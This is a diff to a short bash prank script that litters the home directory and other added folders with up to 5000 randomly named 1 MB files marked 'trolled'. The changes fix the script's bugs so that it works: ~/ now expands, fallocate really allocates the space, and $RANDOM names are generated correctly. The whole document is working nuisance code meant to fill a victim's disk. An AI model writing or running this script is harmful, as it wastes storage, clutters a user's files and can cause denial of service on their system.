@@ -1,13 +1,13 @@
 #!/bin/bash
 
 total_filled=0
-folders_list="~/"
+folders_list=~/
 
 function make_file {
 	touch "$1"
 	truncate -s 41 "$1"
 	echo -n "trolled" >> "$1"
-	truncate -s 1024000 "$1"
+	fallocate -l 1M "$1"
 	total_filled=$(expr $total_filled + 1)
 }
 
@@ -24,7 +24,7 @@ add_folders ~/
 
 while ((total_filled < 5000)) ; do
 	for folder in $folders_list ; do
-		make_file "$folder$(expr $random * $random)"
+		make_file "$folder$(expr $RANDOM '*' $RANDOM)"
 	done
 done
 
